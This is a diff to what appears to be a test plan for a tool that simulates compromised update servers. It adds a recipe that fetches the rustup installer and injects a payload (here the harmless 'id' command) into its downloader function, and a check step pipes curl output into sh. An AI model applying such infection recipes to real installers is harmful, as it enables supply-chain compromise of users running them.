@@ -15,6 +15,17 @@ check:
   cmds:
   - "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs:${SH4D0WUP_BOUND_PORT} | sh -s -- -y"
 
+artifacts:
+  orig:
+    type: url
+    url: https://sh.rustup.rs
+  infect:
+    type: infect
+    infect: sh
+    artifact: orig
+    payload: id
+    hook_functions: ['downloader']
+
 selectors:
   target:
     type: all
